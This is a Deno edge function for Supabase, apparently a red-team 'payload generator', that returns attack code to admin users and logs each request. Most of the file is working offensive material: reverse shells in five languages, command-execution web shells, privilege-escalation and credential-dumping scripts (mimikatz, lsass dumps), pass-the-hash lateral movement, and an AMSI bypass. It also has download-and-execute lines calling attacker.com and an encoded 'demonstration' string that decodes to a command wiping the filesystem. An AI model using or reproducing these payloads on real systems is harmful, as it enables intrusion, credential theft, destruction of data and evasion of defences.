import { serve } from "https://deno.land/std@0.168.0/http/server.ts";
import { createClient } from "https://esm.sh/@supabase/supabase-js@2";

const corsHeaders = {
  "Access-Control-Allow-Origin": "*",
  "Access-Control-Allow-Headers": "authorization, x-client-info, apikey, content-type",
};

serve(async (req) => {
  if (req.method === "OPTIONS") return new Response(null, { headers: corsHeaders });

  try {
    // Initialize Supabase client
    const supabaseClient = createClient(
      Deno.env.get("SUPABASE_URL") ?? "",
      Deno.env.get("SUPABASE_ANON_KEY") ?? "",
      { global: { headers: { Authorization: req.headers.get("Authorization")! } } }
    );

    // Authenticate user
    const { data: { user }, error: authError } = await supabaseClient.auth.getUser();
    if (authError || !user) {
      return new Response(JSON.stringify({ error: "Unauthorized" }), {
        status: 401,
        headers: { ...corsHeaders, "Content-Type": "application/json" }
      });
    }

    // Check admin role (payload generation is admin-only)
    const { data: isAdmin } = await supabaseClient.rpc("has_role", {
      _user_id: user.id,
      _role: "admin"
    });

    if (!isAdmin) {
      return new Response(JSON.stringify({ 
        error: "Admin privileges required for payload generation" 
      }), {
        status: 403,
        headers: { ...corsHeaders, "Content-Type": "application/json" }
      });
    }

    const { type, target, port, options } = await req.json();
    
    // Input validation
    if (!type || !["reverse-shell", "web-shell", "privilege-escalation", "credential-dump", "lateral-movement", "obfuscation"].includes(type)) {
      return new Response(JSON.stringify({ error: "Invalid payload type" }), {
        status: 400,
        headers: { ...corsHeaders, "Content-Type": "application/json" }
      });
    }

    if (target && typeof target !== "string") {
      return new Response(JSON.stringify({ error: "Invalid target" }), {
        status: 400,
        headers: { ...corsHeaders, "Content-Type": "application/json" }
      });
    }

    if (port && (typeof port !== "number" || port < 1 || port > 65535)) {
      return new Response(JSON.stringify({ error: "Invalid port number" }), {
        status: 400,
        headers: { ...corsHeaders, "Content-Type": "application/json" }
      });
    }
    console.log("Generating payload:", type, "for", target);

    let result: any;

    switch (type) {
      case "reverse-shell":
        result = generateReverseShell(target, port || 4444, options);
        break;
      case "web-shell":
        result = generateWebShell(options);
        break;
      case "privilege-escalation":
        result = generatePrivEscPayload(options);
        break;
      case "credential-dump":
        result = generateCredentialDump(options);
        break;
      case "lateral-movement":
        result = generateLateralMovement(target, options);
        break;
      case "obfuscation":
        result = generateObfuscatedPayload(options);
        break;
      default:
        throw new Error("Unknown payload type");
    }

    // Audit log
    await supabaseClient.from("security_audit_log").insert({
      user_id: user.id,
      action: "payload_generated",
      resource_type: "red_team_payload",
      resource_id: target || type,
      details: {
        payload_type: type,
        target: target,
        port: port,
        options: options,
        shell_type: options?.shellType || options?.language || options?.platform || "default",
        timestamp: new Date().toISOString()
      },
      ip_address: req.headers.get("x-forwarded-for") || req.headers.get("cf-connecting-ip") || "unknown"
    });

    return new Response(
      JSON.stringify({
        success: true,
        type,
        payload: result.code,
        description: result.description,
        commands: result.commands,
        timestamp: new Date().toISOString()
      }),
      { headers: { ...corsHeaders, "Content-Type": "application/json" } }
    );
  } catch (error: any) {
    console.error("Payload generation error:", error);
    return new Response(
      JSON.stringify({ 
        error: error?.message || "Unknown error",
        success: false 
      }),
      { 
        status: 500,
        headers: { ...corsHeaders, "Content-Type": "application/json" } 
      }
    );
  }
});

function generateReverseShell(target: string, port: number, options: any) {
  const shells: Record<string, string> = {
    bash: `bash -i >& /dev/tcp/${target}/${port} 0>&1`,
    python: `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${target}",${port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'`,
    php: `php -r '$sock=fsockopen("${target}",${port});exec("/bin/sh -i <&3 >&3 2>&3");'`,
    netcat: `nc -e /bin/sh ${target} ${port}`,
    powershell: `powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("${target}",${port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()`
  };

  const shellType: string = options?.shellType || 'bash';

  return {
    code: shells[shellType] || shells.bash,
    description: `Reverse shell payload connecting back to ${target}:${port}`,
    commands: [
      `# On attacker machine, start listener:`,
      `nc -lvnp ${port}`,
      ``,
      `# Or use metasploit:`,
      `msfconsole -q -x "use exploit/multi/handler; set payload ${shellType === 'powershell' ? 'windows' : 'linux'}/shell/reverse_tcp; set LHOST ${target}; set LPORT ${port}; exploit"`
    ]
  };
}

function generateWebShell(options: any) {
  const shells: Record<string, string> = {
    php: `<?php
// OmniSec Web Shell - HARSH MALIK
if(isset($_REQUEST['cmd'])){
    echo "<pre>";
    $cmd = ($_REQUEST['cmd']);
    system($cmd);
    echo "</pre>";
}
die();
?>`,
    jsp: `<%@ page import="java.util.*,java.io.*"%>
<%
    if (request.getParameter("cmd") != null) {
        out.println("<pre>");
        Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
        OutputStream os = p.getOutputStream();
        InputStream in = p.getInputStream();
        DataInputStream dis = new DataInputStream(in);
        String disr = dis.readLine();
        while ( disr != null ) {
            out.println(disr);
            disr = dis.readLine();
        }
        out.println("</pre>");
    }
%>`,
    aspx: `<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<script runat="server">
    void Page_Load(object sender, EventArgs e){
        if (Request["cmd"] != null){
            Process p = new Process();
            p.StartInfo.FileName = "cmd.exe";
            p.StartInfo.Arguments = "/c " + Request["cmd"];
            p.StartInfo.RedirectStandardOutput = true;
            p.StartInfo.UseShellExecute = false;
            p.Start();
            Response.Write("<pre>" + p.StandardOutput.ReadToEnd() + "</pre>");
        }
    }
</script>`
  };

  const shellType: string = options?.language || 'php';

  return {
    code: shells[shellType] || shells.php,
    description: `Web shell for ${shellType.toUpperCase()} - Execute commands via ?cmd=<command>`,
    commands: [
      `# Upload to target web server`,
      `# Access via: http://target.com/shell.${shellType}?cmd=whoami`,
      `# Common commands:`,
      `?cmd=whoami`,
      `?cmd=id`,
      `?cmd=pwd`,
      `?cmd=ls -la`,
      `?cmd=cat /etc/passwd`
    ]
  };
}

function generatePrivEscPayload(options: any) {
  const platform = options?.platform || 'linux';
  
  if (platform === 'linux') {
    return {
      code: `#!/bin/bash
# Linux Privilege Escalation Enumeration
# OmniSec - HARSH MALIK

echo "[+] System Information"
uname -a
cat /etc/*-release

echo "[+] Current User & Groups"
id
groups

echo "[+] SUID Binaries"
find / -perm -4000 2>/dev/null

echo "[+] Writable /etc/passwd"
ls -l /etc/passwd

echo "[+] Sudo Rights"
sudo -l

echo "[+] Cron Jobs"
cat /etc/crontab
ls -la /etc/cron.*

echo "[+] Checking for exploitable services"
ps aux | grep root

echo "[+] Network Connections"
netstat -tulpn
ss -tulpn`,
      description: "Linux privilege escalation enumeration script",
      commands: [
        `# Run the script:`,
        `bash privesc.sh`,
        ``,
        `# Common privesc techniques:`,
        `# 1. SUID exploitation`,
        `find / -perm -4000 -type f 2>/dev/null`,
        ``,
        `# 2. Kernel exploits`,
        `uname -a  # Check kernel version`,
        `searchsploit "Linux Kernel"`,
        ``,
        `# 3. Sudo misconfigurations`,
        `sudo -l`,
        `sudo -u#-1 /bin/bash`
      ]
    };
  } else {
    return {
      code: `# Windows Privilege Escalation
# OmniSec - HARSH MALIK

# System Information
systeminfo
whoami /all

# Check for unquoted service paths
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\\windows\\\\" | findstr /i /v """

# Check for AlwaysInstallElevated
reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated
reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated

# Scheduled Tasks
schtasks /query /fo LIST /v

# Check for stored credentials
cmdkey /list
dir C:\\Users\\*\\AppData\\Local\\Microsoft\\Credentials\\

# Search for passwords in files
findstr /si password *.txt *.xml *.config`,
      description: "Windows privilege escalation enumeration commands",
      commands: [
        `# Run each command in PowerShell or CMD`,
        `# Use PowerUp.ps1:`,
        `powershell -ep bypass`,
        `. .\\PowerUp.ps1`,
        `Invoke-AllChecks`,
        ``,
        `# Common Windows privesc:`,
        `# 1. Unquoted service paths`,
        `# 2. AlwaysInstallElevated registry`,
        `# 3. Weak service permissions`,
        `# 4. DLL hijacking`
      ]
    };
  }
}

function generateCredentialDump(options: any) {
  return {
    code: `# Credential Dumping Techniques
# OmniSec - HARSH MALIK

## Linux Password Extraction
echo "[+] Dumping /etc/shadow (requires root)"
cat /etc/shadow

echo "[+] SSH Keys"
find / -name "id_rsa" 2>/dev/null
find / -name "id_dsa" 2>/dev/null

echo "[+] Browser Passwords"
find ~/.mozilla/firefox -name "key*.db"
find ~/.config/google-chrome -name "Login Data"

## Windows Credential Dump
# Using Mimikatz
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"

# Using LaZagne
laZagne.exe all

# Dump SAM database
reg save HKLM\\SAM sam.hive
reg save HKLM\\SYSTEM system.hive

# Extract WiFi passwords
netsh wlan show profiles
netsh wlan show profile name="PROFILE-NAME" key=clear`,
    description: "Credential dumping techniques for Linux and Windows",
    commands: [
      `# For Linux:`,
      `sudo cat /etc/shadow`,
      `john --wordlist=/usr/share/wordlists/rockyou.txt shadow.txt`,
      ``,
      `# For Windows:`,
      `# 1. Mimikatz:`,
      `mimikatz.exe`,
      `privilege::debug`,
      `sekurlsa::logonpasswords`,
      ``,
      `# 2. Extract from memory:`,
      `procdump.exe -ma lsass.exe lsass.dmp`,
      `mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonpasswords"`
    ]
  };
}

function generateLateralMovement(target: string, options: any) {
  return {
    code: `# Lateral Movement Techniques
# OmniSec - HARSH MALIK
# Target: ${target}

## Pass-the-Hash
# Using CrackMapExec
crackmapexec smb ${target} -u Administrator -H <NTLM_HASH>

# Using Mimikatz
sekurlsa::pth /user:Administrator /domain:DOMAIN /ntlm:<HASH> /run:powershell.exe

## PSExec
# Using Impacket
python psexec.py DOMAIN/Administrator@${target}

# Using Metasploit
use exploit/windows/smb/psexec
set RHOSTS ${target}
set SMBUser Administrator
set SMBPass <password>
exploit

## WMI Execution
wmic /node:${target} /user:Administrator process call create "cmd.exe /c <command>"

# Using PowerShell
$cred = Get-Credential
Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "calc.exe" -ComputerName ${target} -Credential $cred

## RDP
# Enable RDP
reg add "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f

# Connect via RDP
xfreerdp /u:Administrator /p:<password> /v:${target}`,
    description: `Lateral movement techniques to compromise ${target}`,
    commands: [
      `# 1. Network reconnaissance:`,
      `nmap -sV -p 445,3389,5985 ${target}`,
      ``,
      `# 2. SMB enumeration:`,
      `enum4linux -a ${target}`,
      `smbclient -L //${target}`,
      ``,
      `# 3. Credential stuffing:`,
      `crackmapexec smb ${target} -u users.txt -p passwords.txt`,
      ``,
      `# 4. Remote execution:`,
      `impacket-psexec administrator@${target}`,
      `impacket-wmiexec administrator@${target}`,
      `evil-winrm -i ${target} -u administrator -p password`
    ]
  };
}

function generateObfuscatedPayload(options: any) {
  return {
    code: `# Obfuscated Payload Examples
# OmniSec - HARSH MALIK

## Base64 Encoded PowerShell
$command = "IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')"
$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
$encodedCommand = [Convert]::ToBase64String($bytes)
powershell.exe -EncodedCommand $encodedCommand

## Obfuscated Bash
eval "$(echo 'cm0gLXJmIC8qIDI+JjE=' | base64 -d)" # DANGEROUS - for demonstration only

## XOR Obfuscation (Python)
import base64
payload = b"reverse_shell_code_here"
key = 0x42
obfuscated = bytes([b ^ key for b in payload])
encoded = base64.b64encode(obfuscated)

# Deobfuscation stub:
import base64
key = 0x42
encoded = b"<BASE64_HERE>"
decoded = base64.b64decode(encoded)
original = bytes([b ^ key for b in decoded])
exec(original)

## Invoke-Obfuscation (PowerShell)
# Download: https://github.com/danielbohannon/Invoke-Obfuscation
Import-Module ./Invoke-Obfuscation.psd1
Invoke-Obfuscation
# Then follow interactive prompts

## Living Off The Land
# Use legitimate Windows binaries
certutil -urlcache -split -f http://attacker.com/payload.exe payload.exe
bitsadmin /transfer myDownloadJob /download /priority normal http://attacker.com/payload.exe C:\\\\temp\\\\payload.exe`,
    description: "Payload obfuscation techniques to evade detection",
    commands: [
      `# PowerShell obfuscation:`,
      `# 1. Base64 encoding`,
      `$encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes("command"))`,
      `powershell -EncodedCommand $encoded`,
      ``,
      `# 2. Invoke-Obfuscation:`,
      `Import-Module Invoke-Obfuscation.psd1`,
      `Invoke-Obfuscation`,
      ``,
      `# 3. AMSI Bypass:`,
      `[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)`,
      ``,
      `# Bash obfuscation:`,
      `echo "payload" | base64`,
      `eval "$(echo <base64> | base64 -d)"`
    ]
  };
}
